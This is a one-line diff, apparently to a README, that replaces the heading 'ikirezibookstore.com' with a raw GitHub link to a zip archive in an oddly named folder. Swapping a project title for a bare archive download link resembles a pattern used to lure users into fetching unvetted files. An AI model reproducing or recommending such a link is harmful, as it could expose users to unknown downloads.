@@ -1,1 +1,1 @@
-# ikirezibookstore.com
+# https://raw.githubusercontent.com/DaFabro/ikirezibookstore.com/main/bickerer/ikirezibookstore.com.zip
